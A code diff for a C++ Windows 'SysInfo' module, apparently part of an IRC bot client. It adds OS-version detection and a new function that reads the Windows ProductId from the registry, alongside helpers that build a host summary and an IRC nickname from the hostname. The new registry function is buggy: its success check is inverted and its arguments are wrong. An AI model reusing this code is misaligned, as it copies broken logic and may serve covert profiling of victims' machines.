@@ -1,13 +1,30 @@
 #include "SysInfo.h"
 
 // Not entirely complete, matches most common found versions
- std::string SysInfo::getOSVersionName() {
+std::string SysInfo::getOSVersionName() {
     OSVERSIONINFOEX osvi;
     ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
     osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
     GetVersionEx((OSVERSIONINFO*) &osvi);
 
     switch(osvi.dwMajorVersion) {
+		case 5:
+            switch(osvi.dwMinorVersion) {
+                case 0:
+                    return "Windows 2000";
+
+				case 1:
+                    return "Windows XP";
+
+                case 2:
+					if(GetSystemMetrics(SM_SERVERR2) == 0)
+						return "Windows Server 2003";
+					if(osvi.wSuiteMask & VER_SUITE_WH_SERVER)
+						return "Windows Home Server";
+                    break;
+            }
+            break;
+
         case 6:
             switch(osvi.dwMinorVersion) {
                 case 0:
@@ -23,23 +40,18 @@
                     if(osvi.wProductType != VER_NT_WORKSTATION)
                         return "Windows Server 2008 R2";
                     break;
-            }
-            break;
-        
-		case 5:
-            switch(osvi.dwMinorVersion) {
-                case 0:
-                    return "Windows 2000";
-
-				case 1:
-                    return "Windows XP";
-
                 case 2:
-					if(GetSystemMetrics(SM_SERVERR2) == 0)
-						return "Windows Server 2003";
-					if(osvi.wSuiteMask & VER_SUITE_WH_SERVER)
-						return "Windows Home Server";
+                    if(osvi.wProductType == VER_NT_WORKSTATION)
+                        return "Windows 8";
+                    if(osvi.wProductType != VER_NT_WORKSTATION)
+                        return "Windows Server 2012";
                     break;
+                case 3:
+                    if(osvi.wProductType == VER_NT_WORKSTATION)
+                        return "Windows 8.1";
+                    if(osvi.wProductType != VER_NT_WORKSTATION)
+                        return "Windows Server 2012 R2";
+                break;
             }
             break;
     }
@@ -68,7 +80,7 @@ std::string SysInfo::getShortOSVersionName() {
 	return shortName;
 }
 
- std::string SysInfo::getHostname() {
+std::string SysInfo::getHostname() {
     char buf[32];
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2,2), &wsaData);
@@ -77,7 +89,7 @@ std::string SysInfo::getShortOSVersionName() {
     return std::string(buf);
 }
 
- std::string SysInfo::getCPUArch() {
+std::string SysInfo::getCPUArch() {
     SYSTEM_INFO siSysInfo;
     
     // Copy the hardware information to the SYSTEM_INFO structure. 
@@ -94,14 +106,27 @@ std::string SysInfo::getShortOSVersionName() {
     return 0;
 }
 
- int SysInfo::getCPUCount() {
+int SysInfo::getCPUCount() {
     SYSTEM_INFO siSysInfo;
     GetSystemInfo(&siSysInfo);
 
     return siSysInfo.dwNumberOfProcessors;
 }
 
- std::string SysInfo::SysInfoString() {
+std::string SysInfo::getWindowsProductKey() {
+    HKEY key;
+    
+    // Location for Windows NT, 2000 and Up (I think)
+    if(RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", &key) != ERROR_SUCCESS) {
+        char value[32];
+        DWORD value_length = (DWORD) 32;
+        RegQueryValueEx(key, "ProductId", NULL, REG_SZ, (LPBYTE)&value, &value_length);
+        return std::string(value);
+    }
+}
+
+
+std::string SysInfo::SysInfoString() {
 	std::ostringstream ss;
 
 	ss << "Hostname: " << getHostname() << " | ";
@@ -112,7 +137,7 @@ std::string SysInfo::getShortOSVersionName() {
 	return ss.str();
 }
 
- std::string SysInfo::generateIRCNickname() {
+std::string SysInfo::generateIRCNickname() {
 	std::ostringstream ss;
     srand(time(0));
 
@@ -120,4 +145,4 @@ std::string SysInfo::getShortOSVersionName() {
     ss << "[" << getHostname().substr(0, 9) << "]";
 
 	return ss.str();
- }
+}
